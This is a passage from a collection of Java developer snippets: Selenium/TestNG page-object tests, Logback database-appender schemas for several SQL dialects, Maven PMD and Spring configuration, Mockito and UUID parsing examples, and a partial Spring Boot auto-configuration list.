        result = 31 * result + (h2Text != null ? h2Text.hashCode() : 0);
        return result;
    }

    @Override
    public String toString() {
        return "Module{" +
                "image=" + image +
                ", h2Text='" + h2Text + '\'' +
                '}';
    }
}
--------------------------------------------------------------------------------------------------------
import browser.BrowserGetter;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.support.PageFactory;
import org.testng.annotations.AfterClass;
import org.testng.annotations.BeforeClass;
import org.testng.annotations.Test;
import pageobjects.stpcon17.ModulesPage;

import java.io.File;

import static org.testng.Assert.assertEquals;

public class ModulesTest {

    private final Image readingModuleImage = new Image("https://c1.staticflickr.com/8/7494/27510788280_a9f43c3845_s" +
            ".jpg", "125", "125");
    private final Image travelModuleImage = new Image("https://farm2.staticflickr.com/1642/25881055090_e29679a37d_q" +
            ".jpg", "125", "125");
    private final Image photoModuleImage = new Image("https://farm1.staticflickr.com/612/32840145345_4bdf828d8f_q" +
            ".jpg", "125", "125");

    private final Module readingModule = new Module(readingModuleImage, "Go ahead. Read something!");
    private final Module travelModule = new Module(travelModuleImage, "Go out, do some sightseeing!");
    private final Module photoModule = new Module(photoModuleImage, "Chill. Look at some photos!");

    //webDriver instance
    private WebDriver webDriver;
    //class used for initializing browser
    private BrowserGetter browserGetter = new BrowserGetter();
    //page object class
    private ModulesPage page;

    @BeforeClass
    public void beforeClass() {
        //initialize the Chrome browser here
        webDriver = browserGetter.getChromeDriver();
        //initialize page object class
        page = PageFactory.initElements(webDriver, ModulesPage.class);
        webDriver.get(new File("src/test/resources/htmls/testconlt17/newPage.html").getAbsolutePath());
    }

    @AfterClass
    public void afterClass() {
        webDriver.quit();
    }

    @Test
    public void images() throws InterruptedException {
        assertEquals(new Image(page.readingModuleImageElement), readingModuleImage);
        assertEquals(new Image(page.travelModuleImageElement), travelModuleImage);
        assertEquals(new Image(page.photoModuleImageElement), photoModuleImage);
    }


    @Test
    public void modules() {
        assertEquals(new Module(page.readingModuleElement), readingModule);
        assertEquals(new Module(page.travelModuleElement), travelModule);
        assertEquals(new Module(page.photoModuleElement), photoModule);
    }
}
--------------------------------------------------------------------------------------------------------
import org.openqa.selenium.By;
import org.openqa.selenium.WebElement;

public class Module {
    private Image image;
    private String h2Text;
    private Link link;

    public Module(Image image, String h2Text, Link link) {
        this.image = image;
        this.h2Text = h2Text;
        this.link = link;
    }

    public Module(WebElement element) {
        this.image = new Image(element.findElement(By.cssSelector("img")));
        this.h2Text = element.findElement(By.cssSelector("h2")).getText();
        this.link = new Link(element.findElement(By.cssSelector("a")));
    }

    @Override
    public boolean equals(Object o) {
        if (this == o) return true;
        if (o == null || getClass() != o.getClass()) return false;

        Module module = (Module) o;

        if (image != null ? !image.equals(module.image) : module.image != null) return false;
        if (h2Text != null ? !h2Text.equals(module.h2Text) : module.h2Text != null) return false;
        return link != null ? link.equals(module.link) : module.link == null;
    }

    @Override
    public int hashCode() {
        int result = image != null ? image.hashCode() : 0;
        result = 31 * result + (h2Text != null ? h2Text.hashCode() : 0);
        result = 31 * result + (link != null ? link.hashCode() : 0);
        return result;
    }

    @Override
    public String toString() {
        return "Module{" +
                "image=" + image +
                ", h2Text='" + h2Text + '\'' +
                ", link=" + link +
                '}';
    }
}
--------------------------------------------------------------------------------------------------------
import browser.BrowserGetter;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.support.PageFactory;
import org.testng.annotations.AfterClass;
import org.testng.annotations.BeforeClass;
import org.testng.annotations.Test;
import pageobjects.stpcon17.ModulesPage;

import java.io.File;

import static org.testng.Assert.assertEquals;

public class ModulesTest {

    private final Image readingModuleImage = new Image("https://c1.staticflickr.com/8/7494/27510788280_a9f43c3845_s" +
            ".jpg", "125", "125");
    private final Image travelModuleImage = new Image("https://farm2.staticflickr.com/1642/25881055090_e29679a37d_q" +
            ".jpg", "125", "125");
    private final Image photoModuleImage = new Image("https://farm1.staticflickr.com/612/32840145345_4bdf828d8f_q" +
            ".jpg", "125", "125");

    private final Link readingModuleLink = new Link("http://iamalittletester.wordpress.com/", "Read about testing",
            "_blank");
    private final Link travelModuleLink = new Link("http://travelwithcori.wordpress.com/", "Read a travel blog",
            "_blank");
    private final Link photoModuleLink = new Link("https://www.flickr.com/photos/capreoara", "Look at photos",
            "_blank");

    private final Module readingModule = new Module(readingModuleImage, "Go ahead. Read something!", readingModuleLink);
    private final Module travelModule = new Module(travelModuleImage, "Go out, do some sightseeing!", travelModuleLink);
    private final Module photoModule = new Module(photoModuleImage, "Chill. Look at some photos!", photoModuleLink);

    //webDriver instance
    private WebDriver webDriver;
    //class used for initializing browser
    private BrowserGetter browserGetter = new BrowserGetter();
    //page object class
    private ModulesPage page;

    @BeforeClass
    public void beforeClass() {
        //initialize the Chrome browser here
        webDriver = browserGetter.getChromeDriver();
        //initialize page object class
        page = PageFactory.initElements(webDriver, ModulesPage.class);
        webDriver.get(new File("src/test/resources/htmls/stpcon17/fullPage.html").getAbsolutePath());
    }

    @AfterClass
    public void afterClass() {
        webDriver.quit();
    }

    @Test
    public void images() throws InterruptedException {
        assertEquals(new Image(page.readingModuleImageElement), readingModuleImage);
        assertEquals(new Image(page.travelModuleImageElement), travelModuleImage);
        assertEquals(new Image(page.photoModuleImageElement), photoModuleImage);
    }

    @Test
    public void links() {
        assertEquals(new Link(page.readingModuleLinkElement), readingModuleLink);
        assertEquals(new Link(page.travelModuleLinkElement), travelModuleLink);
        assertEquals(new Link(page.photoModuleLinkElement), photoModuleLink);
    }

    @Test
    public void modules() {
        assertEquals(new Module(page.readingModuleElement), readingModule);
        assertEquals(new Module(page.travelModuleElement), travelModule);
        assertEquals(new Module(page.photoModuleElement), photoModule);
    }
}
--------------------------------------------------------------------------------------------------------
# mssql
DROP TABLE logging_event_property 
DROP TABLE logging_event_exception 
DROP TABLE logging_event 

CREATE TABLE logging_event 
  ( 
    timestmp         DECIMAL(20) NOT NULL,
   	formatted_message  VARCHAR(4000) NOT NULL,
    logger_name       VARCHAR(254) NOT NULL,
    level_string      VARCHAR(254) NOT NULL,
    thread_name       VARCHAR(254),
    reference_flag    SMALLINT,
    arg0              VARCHAR(254),
    arg1              VARCHAR(254),
    arg2              VARCHAR(254),
    arg3              VARCHAR(254),
    caller_filename   VARCHAR(254) NOT NULL,
    caller_class      VARCHAR(254) NOT NULL,
    caller_method     VARCHAR(254) NOT NULL,
    caller_line       CHAR(4) NOT NULL,
    event_id          DECIMAL(40) NOT NULL identity,
    PRIMARY KEY(event_id) 
  ) 

CREATE TABLE logging_event_property 
  ( 
    event_id          DECIMAL(40) NOT NULL, 
    mapped_key        VARCHAR(254) NOT NULL, 
    mapped_value      VARCHAR(1024), 
    PRIMARY KEY(event_id, mapped_key), 
    FOREIGN KEY (event_id) REFERENCES logging_event(event_id) 
  ) 

CREATE TABLE logging_event_exception 
  ( 
    event_id         DECIMAL(40) NOT NULL, 
    i                SMALLINT NOT NULL, 
    trace_line       VARCHAR(254) NOT NULL, 
    PRIMARY KEY(event_id, i), 
    FOREIGN KEY (event_id) REFERENCES logging_event(event_id) 
  ) 
  
# hsqldb
DROP TABLE logging_event_exception IF EXISTS;
DROP TABLE logging_event_property IF EXISTS;
DROP TABLE logging_event IF EXISTS;

CREATE TABLE logging_event (
  timestmp BIGINT NOT NULL,
  formatted_message LONGVARCHAR NOT NULL,
  logger_name VARCHAR(256) NOT NULL,
  level_string VARCHAR(256) NOT NULL,
  thread_name VARCHAR(256),
  reference_flag SMALLINT,
  arg0 VARCHAR(256),
  arg1 VARCHAR(256),
  arg2 VARCHAR(256),
  arg3 VARCHAR(256),
  caller_filename VARCHAR(256), 
  caller_class VARCHAR(256), 
  caller_method VARCHAR(256), 
  caller_line CHAR(4),
  event_id BIGINT NOT NULL IDENTITY);


CREATE TABLE logging_event_property (
  event_id BIGINT NOT NULL,
  mapped_key  VARCHAR(254) NOT NULL,
  mapped_value LONGVARCHAR,
  PRIMARY KEY(event_id, mapped_key),
  FOREIGN KEY (event_id) REFERENCES logging_event(event_id));

CREATE TABLE logging_event_exception (
  event_id BIGINT NOT NULL,
  i SMALLINT NOT NULL,
  trace_line VARCHAR(256) NOT NULL,
  PRIMARY KEY(event_id, i),
  FOREIGN KEY (event_id) REFERENCES logging_event(event_id));
  
# h2
DROP TABLE logging_event_exception IF EXISTS;
DROP TABLE logging_event_property IF EXISTS;
DROP TABLE logging_event IF EXISTS;

CREATE TABLE logging_event (
  timestmp BIGINT NOT NULL,
  formatted_message LONGVARCHAR NOT NULL,
  logger_name VARCHAR(256) NOT NULL,
  level_string VARCHAR(256) NOT NULL,
  thread_name VARCHAR(256),
  reference_flag SMALLINT,
  arg0 VARCHAR(256),
  arg1 VARCHAR(256),
  arg2 VARCHAR(256),
  arg3 VARCHAR(256),
  caller_filename VARCHAR(256), 
  caller_class VARCHAR(256), 
  caller_method VARCHAR(256), 
  caller_line CHAR(4),
  event_id IDENTITY NOT NULL);


CREATE TABLE logging_event_property (
  event_id BIGINT NOT NULL,
  mapped_key  VARCHAR(254) NOT NULL,
  mapped_value LONGVARCHAR,
  PRIMARY KEY(event_id, mapped_key),
  FOREIGN KEY (event_id) REFERENCES logging_event(event_id));

CREATE TABLE logging_event_exception (
  event_id BIGINT NOT NULL,
  i SMALLINT NOT NULL,
  trace_line VARCHAR(256) NOT NULL,
  PRIMARY KEY(event_id, i),
  FOREIGN KEY (event_id) REFERENCES logging_event(event_id));

# db2
DROP TABLE  logging_event_property;
DROP TABLE  logging_event_exception;
DROP TABLE  logging_event;

CREATE TABLE logging_event 
  (
    timestmp          BIGINT NOT NULL,
   	formatted_message VARCHAR(4000) NOT NULL,
    logger_name       VARCHAR(254) NOT NULL,
    level_string      VARCHAR(254) NOT NULL,
    thread_name       VARCHAR(254),
    reference_flag    SMALLINT,
    arg0              VARCHAR(254),
    arg1              VARCHAR(254),
    arg2              VARCHAR(254),
    arg3              VARCHAR(254),
    caller_filename   VARCHAR(254) NOT NULL,
    caller_class      VARCHAR(254) NOT NULL,
    caller_method     VARCHAR(254) NOT NULL,
    caller_line       CHAR(4) NOT NULL,
    event_id           INTEGER GENERATED ALWAYS AS IDENTITY (START WITH 1)
  );

CREATE TABLE logging_event_property
  (
    event_id	      INTEGER NOT NULL,
    mapped_key        VARCHAR(254) NOT NULL,
    mapped_value      VARCHAR(1024),
    PRIMARY KEY(event_id, mapped_key),
    FOREIGN KEY (event_id) REFERENCES logging_event(event_id)
  );

CREATE TABLE logging_event_exception
  (
    event_id         INTEGER NOT NULL,
    i                SMALLINT NOT NULL,
    trace_line       VARCHAR(254) NOT NULL,
    PRIMARY KEY(event_id, i),
    FOREIGN KEY (event_id) REFERENCES logging_event(event_id)
  );

# mysql
BEGIN;
DROP TABLE IF EXISTS logging_event_property;
DROP TABLE IF EXISTS logging_event_exception;
DROP TABLE IF EXISTS logging_event;
COMMIT;


BEGIN;
CREATE TABLE logging_event 
  (
    timestmp         BIGINT NOT NULL,
    formatted_message  TEXT NOT NULL,
    logger_name       VARCHAR(254) NOT NULL,
    level_string      VARCHAR(254) NOT NULL,
    thread_name       VARCHAR(254),
    reference_flag    SMALLINT,
    arg0              VARCHAR(254),
    arg1              VARCHAR(254),
    arg2              VARCHAR(254),
    arg3              VARCHAR(254),
    caller_filename   VARCHAR(254) NOT NULL,
    caller_class      VARCHAR(254) NOT NULL,
    caller_method     VARCHAR(254) NOT NULL,
    caller_line       CHAR(4) NOT NULL,
    event_id          BIGINT NOT NULL AUTO_INCREMENT PRIMARY KEY
  );
COMMIT;

BEGIN;
CREATE TABLE logging_event_property
  (
    event_id	      BIGINT NOT NULL,
    mapped_key        VARCHAR(254) NOT NULL,
    mapped_value      TEXT,
    PRIMARY KEY(event_id, mapped_key),
    FOREIGN KEY (event_id) REFERENCES logging_event(event_id)
  );
COMMIT;

BEGIN;
CREATE TABLE logging_event_exception
  (
    event_id         BIGINT NOT NULL,
    i                SMALLINT NOT NULL,
    trace_line       VARCHAR(254) NOT NULL,
    PRIMARY KEY(event_id, i),
    FOREIGN KEY (event_id) REFERENCES logging_event(event_id)
  );
COMMIT;

# oracle
CREATE SEQUENCE logging_event_id_seq MINVALUE 1 START WITH 1;

CREATE TABLE logging_event 
  (
    timestmp         NUMBER(20) NOT NULL,
    formatted_message  VARCHAR2(4000) NOT NULL,
    logger_name       VARCHAR(254) NOT NULL,
    level_string      VARCHAR(254) NOT NULL,
    thread_name       VARCHAR(254),
    reference_flag    SMALLINT,
    arg0              VARCHAR(254),
    arg1              VARCHAR(254),
    arg2              VARCHAR(254),
    arg3              VARCHAR(254),
    caller_filename   VARCHAR(254) NOT NULL,
    caller_class      VARCHAR(254) NOT NULL,
    caller_method     VARCHAR(254) NOT NULL,
    caller_line       CHAR(4) NOT NULL,
    event_id          NUMBER(10) PRIMARY KEY
  );


-- the / suffix may or may not be needed depending on your SQL Client
-- Some SQL Clients, e.g. SQuirrel SQL has trouble with the following
-- trigger creation command, while SQLPlus (the basic SQL Client which
-- ships with Oracle) has no trouble at all.

CREATE TRIGGER logging_event_id_seq_trig
  BEFORE INSERT ON logging_event
  FOR EACH ROW  
  BEGIN  
    SELECT logging_event_id_seq.NEXTVAL 
    INTO   :NEW.event_id 
    FROM   DUAL;  
  END;
/


CREATE TABLE logging_event_property
  (
    event_id	      NUMBER(10) NOT NULL,
    mapped_key        VARCHAR2(254) NOT NULL,
    mapped_value      VARCHAR2(1024),
    PRIMARY KEY(event_id, mapped_key),
    FOREIGN KEY (event_id) REFERENCES logging_event(event_id)
  );
  
CREATE TABLE logging_event_exception
  (
    event_id         NUMBER(10) NOT NULL,
    i                SMALLINT NOT NULL,
    trace_line       VARCHAR2(254) NOT NULL,
    PRIMARY KEY(event_id, i),
    FOREIGN KEY (event_id) REFERENCES logging_event(event_id)
  );
  
# postgresql
DROP TABLE    logging_event_property;
DROP TABLE    logging_event_exception;
DROP TABLE    logging_event;
DROP SEQUENCE logging_event_id_seq;


CREATE SEQUENCE logging_event_id_seq MINVALUE 1 START 1;


CREATE TABLE logging_event 
  (
    timestmp         BIGINT NOT NULL,
    formatted_message  TEXT NOT NULL,
    logger_name       VARCHAR(254) NOT NULL,
    level_string      VARCHAR(254) NOT NULL,
    thread_name       VARCHAR(254),
    reference_flag    SMALLINT,
    arg0              VARCHAR(254),
    arg1              VARCHAR(254),
    arg2              VARCHAR(254),
    arg3              VARCHAR(254),
    caller_filename   VARCHAR(254) NOT NULL,
    caller_class      VARCHAR(254) NOT NULL,
    caller_method     VARCHAR(254) NOT NULL,
    caller_line       CHAR(4) NOT NULL,
    event_id          BIGINT DEFAULT nextval('logging_event_id_seq') PRIMARY KEY
  );

CREATE TABLE logging_event_property
  (
    event_id	      BIGINT NOT NULL,
    mapped_key        VARCHAR(254) NOT NULL,
    mapped_value      VARCHAR(1024),
    PRIMARY KEY(event_id, mapped_key),
    FOREIGN KEY (event_id) REFERENCES logging_event(event_id)
  );

CREATE TABLE logging_event_exception
  (
    event_id         BIGINT NOT NULL,
    i                SMALLINT NOT NULL,
    trace_line       VARCHAR(254) NOT NULL,
    PRIMARY KEY(event_id, i),
    FOREIGN KEY (event_id) REFERENCES logging_event(event_id)
  );

# sqllite
BEGIN;
DROP TABLE IF EXISTS logging_event_property;
DROP TABLE IF EXISTS logging_event_exception;
DROP TABLE IF EXISTS logging_event;
COMMIT;


BEGIN;
CREATE TABLE logging_event
  (
    timestmp         BIGINT NOT NULL,
    formatted_message  TEXT NOT NULL,
    logger_name       VARCHAR(254) NOT NULL,
    level_string      VARCHAR(254) NOT NULL,
    thread_name       VARCHAR(254),
    reference_flag    SMALLINT,
    arg0              VARCHAR(254),
    arg1              VARCHAR(254),
    arg2              VARCHAR(254),
    arg3              VARCHAR(254),
    caller_filename   VARCHAR(254) NOT NULL,
    caller_class      VARCHAR(254) NOT NULL,
    caller_method     VARCHAR(254) NOT NULL,
    caller_line       CHAR(4) NOT NULL,
    event_id          INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT
  );
COMMIT;

BEGIN;
CREATE TABLE logging_event_property
  (
    event_id	      BIGINT NOT NULL,
    mapped_key        VARCHAR(254) NOT NULL,
    mapped_value      TEXT,
    PRIMARY KEY(event_id, mapped_key),
    FOREIGN KEY (event_id) REFERENCES logging_event(event_id)
  );
COMMIT;

BEGIN;
CREATE TABLE logging_event_exception
  (
    event_id         BIGINT NOT NULL,
    i                SMALLINT NOT NULL,
    trace_line       VARCHAR(254) NOT NULL,
    PRIMARY KEY(event_id, i),
    FOREIGN KEY (event_id) REFERENCES logging_event(event_id)
  );
COMMIT;

# sybase
DROP TABLE logging_event_property 
DROP TABLE logging_event_exception 
DROP TABLE logging_event 

CREATE TABLE logging_event 
( 
  timestmp         bigint NOT NULL,
  formatted_message  LONG VARCHAR NOT NULL,
  logger_name       VARCHAR(254) NOT NULL,
  level_string      VARCHAR(254) NOT NULL,
  thread_name       VARCHAR(254),
  reference_flag    SMALLINT,
  arg0              VARCHAR(254),
  arg1              VARCHAR(254),
  arg2              VARCHAR(254),
  arg3              VARCHAR(254),  
  caller_filename   VARCHAR(254) NOT NULL,
  caller_class      VARCHAR(254) NOT NULL,
  caller_method     VARCHAR(254) NOT NULL,
  caller_line       varCHAR(4) NOT NULL,
  event_id          int NOT NULL DEFAULT AUTOINCREMENT,
  PRIMARY KEY(event_id) 
) 			

CREATE TABLE logging_event_property 
  ( 
	event_id          int NOT NULL REFERENCES logging_event(event_id), 
	mapped_key        VARCHAR(254) NOT NULL, 
	mapped_value      LONG VARCHAR, 
	PRIMARY KEY(event_id, mapped_key) 
  ) 

CREATE TABLE logging_event_exception 
  ( 
	event_id         int NOT NULL REFERENCES logging_event(event_id) , 
	i                SMALLINT NOT NULL, 
	trace_line       VARCHAR(254) NOT NULL, 
	PRIMARY KEY(event_id, i) 
  )
--------------------------------------------------------------------------------------------------------
  public Platform getPlatform() {
    return Stream.of("platform", "platformName")
        .map(this::getCapability)
        .filter(Objects::nonNull)
        .map(cap -> {
          if (cap instanceof Platform) {
            return (Platform) cap;
          }

          try {
            return Platform.fromString((String.valueOf(cap)));
          } catch (WebDriverException e) {
            return null;
          }
        })
        .filter(Objects::nonNull)
        .findFirst()
        .orElse(null);
  }
--------------------------------------------------------------------------------------------------------
                <plugin>
                    <groupId>org.apache.maven.plugins</groupId>
                    <artifactId>maven-pmd-plugin</artifactId>
                    <version>3.6</version>
                    <configuration>
                        <failOnViolation>true</failOnViolation>
                        <excludeRoots>
                            <excludeRoot>target/generated-sources/plugin</excludeRoot>
                        </excludeRoots>
                        <excludes>
                            <exclude>**/HelpMojo.java</exclude>
                        </excludes>
                    </configuration>
                    <executions>
                        <execution>
                            <goals>
                                <goal>check</goal>
                                <goal>cpd-check</goal>
                            </goals>
                            <configuration>
                                <failOnViolation>true</failOnViolation>
                                <excludes>
                                    <exclude>**/HelpMojo.java</exclude>
                                </excludes>
                            </configuration>
                        </execution>
                    </executions>
                </plugin>
--------------------------------------------------------------------------------------------------------
@TestPropertySource(properties = { "spring.config.location = classpath:<path-to-your-yml-file>" }

        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-configuration-processor</artifactId>
        </dependency>
--------------------------------------------------------------------------------------------------------
import org.testng.annotations.Test;

public class ReplaceAllTest {

    @Test
    public void replaceAllExamples() {
        String complexString = "3ifhuq023hjk@jka$ksoap";
        String withWhiteSpacesString = "This is a string\n " +
                "that streches on several lines.\n" +
                "to demo how to remove whitespaces and newlines\n " +
                "from a\n" +
                "string\n";
        String phraseString = "This is just a phrase String.";
        //removing all alphabetical characters from a string
        System.out.println(complexString.replaceAll("\\D", ""));
        //removing all numeric characters from a string
        System.out.println(complexString.replaceAll("\\d", ""));

        //output of what the string with newlines looks like on the console
        System.out.println("String with new line characters before replace: " + withWhiteSpacesString);
        //removing the new lines from the string
        System.out.println("String with new line characters before replacing new lines: " + withWhiteSpacesString
                .replaceAll("\n", ""));
        //removing all whitespace characters from string (including new line, space)
        System.out.println("String with new line characters before replacing all white space: " + withWhiteSpacesString
                .replaceAll("\\s", ""));

        System.out.println("String whose small a letters became capital letter: " + phraseString.replaceAll
                ("a", "A"));
        System.out.println("String whose small a letters became capital letter: " + complexString.replaceAll
                ("\\d", " "));
        System.out.println(complexString.replaceAll("jk", "_"));
    }
}
--------------------------------------------------------------------------------------------------------
import static org.mockito.Mockito.*;
import static org.junit.Assert.*;

@Test
public void test1()  {
        //  create mock
        MyClass test = mock(MyClass.class);

        // define return value for method getUniqueId()
        when(test.getUniqueId()).thenReturn(43);

        // use mock in test....
        assertEquals(test.getUniqueId(), 43);
}


// demonstrates the return of multiple values
@Test
public void testMoreThanOneReturnValue()  {
        Iterator<String> i= mock(Iterator.class);
        when(i.next()).thenReturn("Mockito").thenReturn("rocks");
        String result= i.next()+" "+i.next();
        //assert
        assertEquals("Mockito rocks", result);
}

// this test demonstrates how to return values based on the input
@Test
public void testReturnValueDependentOnMethodParameter()  {
        Comparable<String> c= mock(Comparable.class);
        when(c.compareTo("Mockito")).thenReturn(1);
        when(c.compareTo("Eclipse")).thenReturn(2);
        //assert
        assertEquals(1, c.compareTo("Mockito"));
}

// this test demonstrates how to return values independent of the input value

@Test
public void testReturnValueInDependentOnMethodParameter()  {
        Comparable<Integer> c= mock(Comparable.class);
        when(c.compareTo(anyInt())).thenReturn(-1);
        //assert
        assertEquals(-1, c.compareTo(9));
}

// return a value based on the type of the provide parameter

@Test
public void testReturnValueInDependentOnMethodParameter2()  {
        Comparable<Todo> c= mock(Comparable.class);
        when(c.compareTo(isA(Todo.class))).thenReturn(0);
        //assert
        assertEquals(0, c.compareTo(new Todo(1)));
}
--------------------------------------------------------------------------------------------------------
@EnableWebMvc
@ComponentScan("io.github.d2edev.mywebapp.web")
public class WebDispatcherConfig extends WebMvcConfigurerAdapter {
public static final String WEBAPP_PREFIX="/web";
public static final String PREFIX_NAME="wepbrefix";

@Bean
public ViewResolver viewResolver() {
    InternalResourceViewResolver resolver = new InternalResourceViewResolver();
    resolver.setPrefix("/WEB-INF/jsp/");
    resolver.setSuffix(".jsp");
    resolver.setExposeContextBeansAsAttributes(true);
    return resolver;
}



@Override
public void configureDefaultServletHandling(DefaultServletHandlerConfigurer configurer) {
    configurer.enable();
}

@Override
public void addResourceHandlers(ResourceHandlerRegistry registry) {
    registry.addResourceHandler("/resources/**").addResourceLocations("/resources/");
}
--------------------------------------------------------------------------------------------------------
@RunWith(SpringJUnit4ClassRunner.class)
@ContextConfiguration(classes={WebDispatcherConfig.class,DataConfig.class})
@WebAppConfiguration
public class HomeControllerTest {

private MockMvc mockMvc;

@Autowired
private WebApplicationContext wac ;

@Before
public void setUp() {
    this.mockMvc = webAppContextSetup(wac).build();
    System.out.println(Arrays.toString(wac.getBeanDefinitionNames()));

}

@Test
public void testHome() throws Exception {


    mockMvc
    .perform(get(WebDispatcherConfig.WEBAPP_PREFIX))
    .andExpect(view().name(HomeController.HOME))
    .andExpect(model().attributeExists(WebDispatcherConfig.PREFIX_NAME));
}

}
--------------------------------------------------------------------------------------------------------
## Let’s generate a unique key using ‘SHA-256’ and a random UUID:

MessageDigest salt = MessageDigest.getInstance("SHA-256");
salt.update(UUID.randomUUID().toString().getBytes("UTF-8"));
String digest = bytesToHex(salt.digest());
--------------------------------------------------------------------------------------------------------
Case-1: Few junk characters
@Test
public void testUUIDFormat_JunkCharacters()
{
    String uuidInStr = "abc";
    UUID uuid = UUID.fromString(uuidInStr);
}
This test will result an exception: java.lang.IllegalArgumentException: Invalid UUID string: abc
    at java.util.UUID.fromString(UUID.java:194)

Case-2: Valid UUID
@Test
public void testUUIDFormat_ProperFormat()
{
    String uuidInStr = "3dd4fa6e-2899-4429-b818-d34fe8df5dd0";
    UUID uuid = UUID.fromString(uuidInStr);
    Assert.assertEquals(uuidInStr, uuid.toString());
    System.out.println(uuid);
}
If you pass a valid UUID, it works fine.

Case-3: Few characters missing in 1st & 5th group
@Test
public void testUUIDFormat_MissingCharacters()
{
    String uuidInStr = "3dd4fa-2899-4429-b818-d34fe8df5d";
    UUID uuid = UUID.fromString(uuidInStr);
    System.out.println(uuid);
    Assert.assertEquals(uuidInStr, uuid.toString());
}
If you observe, resulted string was “003dd4fa-2899-4429-b818-00d34fe8df5d”; 0’s added at the beginning. So when you compare, it fails the test case.

Case-4: Few extra characters in 1st & 5th group
@Test
public void testUUIDFormat_MoreCharacters()
{
    String uuidInStr = "3dd5ee1234-2899-4429-b818-d34fe8df5ee123";
    UUID uuid = UUID.fromString(uuidInStr);
    System.out.println(uuid);
    Assert.assertEquals(uuidInStr, uuid.toString());
} 
--------------------------------------------------------------------------------------------------------
# Initializers
org.springframework.context.ApplicationContextInitializer=\
org.springframework.boot.autoconfigure.SharedMetadataReaderFactoryContextInitializer,\
org.springframework.boot.autoconfigure.logging.ConditionEvaluationReportLoggingListener

# Application Listeners
org.springframework.context.ApplicationListener=\
org.springframework.boot.autoconfigure.BackgroundPreinitializer

# Auto Configuration Import Listeners
org.springframework.boot.autoconfigure.AutoConfigurationImportListener=\
org.springframework.boot.autoconfigure.condition.ConditionEvaluationReportAutoConfigurationImportListener

# Auto Configuration Import Filters
org.springframework.boot.autoconfigure.AutoConfigurationImportFilter=\
org.springframework.boot.autoconfigure.condition.OnBeanCondition,\
org.springframework.boot.autoconfigure.condition.OnClassCondition,\
org.springframework.boot.autoconfigure.condition.OnWebApplicationCondition

# Auto Configure
org.springframework.boot.autoconfigure.EnableAutoConfiguration=\
org.springframework.boot.autoconfigure.admin.SpringApplicationAdminJmxAutoConfiguration,\
org.springframework.boot.autoconfigure.aop.AopAutoConfiguration,\
org.springframework.boot.autoconfigure.amqp.RabbitAutoConfiguration,\
org.springframework.boot.autoconfigure.batch.BatchAutoConfiguration,\
org.springframework.boot.autoconfigure.cache.CacheAutoConfiguration,\
org.springframework.boot.autoconfigure.cassandra.CassandraAutoConfiguration,\
org.springframework.boot.autoconfigure.cloud.CloudServiceConnectorsAutoConfiguration,\
org.springframework.boot.autoconfigure.context.ConfigurationPropertiesAutoConfiguration,\
org.springframework.boot.autoconfigure.context.MessageSourceAutoConfiguration,\
org.springframework.boot.autoconfigure.context.PropertyPlaceholderAutoConfiguration,\
org.springframework.boot.autoconfigure.couchbase.CouchbaseAutoConfiguration,\
org.springframework.boot.autoconfigure.dao.PersistenceExceptionTranslationAutoConfiguration,\
org.springframework.boot.autoconfigure.data.cassandra.CassandraDataAutoConfiguration,\
org.springframework.boot.autoconfigure.data.cassandra.CassandraReactiveDataAutoConfiguration,\
org.springframework.boot.autoconfigure.data.cassandra.CassandraReactiveRepositoriesAutoConfiguration,\
org.springframework.boot.autoconfigure.data.cassandra.CassandraRepositoriesAutoConfiguration,\
org.springframework.boot.autoconfigure.data.couchbase.CouchbaseDataAutoConfiguration,\
org.springframework.boot.autoconfigure.data.couchbase.CouchbaseReactiveDataAutoConfiguration,\
org.springframework.boot.autoconfigure.data.couchbase.CouchbaseReactiveRepositoriesAutoConfiguration,\
org.springframework.boot.autoconfigure.data.couchbase.CouchbaseRepositoriesAutoConfiguration,\
org.springframework.boot.autoconfigure.data.elasticsearch.ElasticsearchAutoConfiguration,\
org.springframework.boot.autoconfigure.data.elasticsearch.ElasticsearchDataAutoConfiguration,\
org.springframework.boot.autoconfigure.data.elasticsearch.ElasticsearchRepositoriesAutoConfiguration,\
org.springframework.boot.autoconfigure.data.jdbc.JdbcRepositoriesAutoConfiguration,\
org.springframework.boot.autoconfigure.data.jpa.JpaRepositoriesAutoConfiguration,\
org.springframework.boot.autoconfigure.data.ldap.LdapRepositoriesAutoConfiguration,\
org.springframework.boot.autoconfigure.data.mongo.MongoDataAutoConfiguration,\
org.springframework.boot.autoconfigure.data.mongo.MongoReactiveDataAutoConfiguration,\
org.springframework.boot.autoconfigure.data.mongo.MongoReactiveRepositoriesAutoConfiguration,\
org.springframework.boot.autoconfigure.data.mongo.MongoRepositoriesAutoConfiguration,\
org.springframework.boot.autoconfigure.data.neo4j.Neo4jDataAutoConfiguration,\
org.springframework.boot.autoconfigure.data.neo4j.Neo4jRepositoriesAutoConfiguration,\
org.springframework.boot.autoconfigure.data.solr.SolrRepositoriesAutoConfiguration,\
org.springframework.boot.autoconfigure.data.redis.RedisAutoConfiguration,\
org.springframework.boot.autoconfigure.data.redis.RedisReactiveAutoConfiguration,\
org.springframework.boot.autoconfigure.data.redis.RedisRepositoriesAutoConfiguration,\
org.springframework.boot.autoconfigure.data.rest.RepositoryRestMvcAutoConfiguration,\
org.springframework.boot.autoconfigure.data.web.SpringDataWebAutoConfiguration,\
org.springframework.boot.autoconfigure.elasticsearch.jest.JestAutoConfiguration,\
org.springframework.boot.autoconfigure.elasticsearch.rest.RestClientAutoConfiguration,\
org.springframework.boot.autoconfigure.flyway.FlywayAutoConfiguration,\
org.springframework.boot.autoconfigure.freemarker.FreeMarkerAutoConfiguration,\
org.springframework.boot.autoconfigure.gson.GsonAutoConfiguration,\
org.springframework.boot.autoconfigure.h2.H2ConsoleAutoConfiguration,\
org.springframework.boot.autoconfigure.hateoas.HypermediaAutoConfiguration,\
org.springframework.boot.autoconfigure.hazelcast.HazelcastAutoConfiguration,\
org.springframework.boot.autoconfigure.hazelcast.HazelcastJpaDependencyAutoConfiguration,\
org.springframework.boot.autoconfigure.http.HttpMessageConvertersAutoConfiguration,\
org.springframework.boot.autoconfigure.http.codec.CodecsAutoConfiguration,\
org.springframework.boot.autoconfigure.influx.InfluxDbAutoConfiguration,\
org.springframework.boot.autoconfigure.info.ProjectInfoAutoConfiguration,\
org.springframework.boot.autoconfigure.integration.IntegrationAutoConfiguration,\
org.springframework.boot.autoconfigure.jackson.JacksonAutoConfiguration,\
org.springframework.boot.autoconfigure.jdbc.DataSourceAutoConfiguration,\
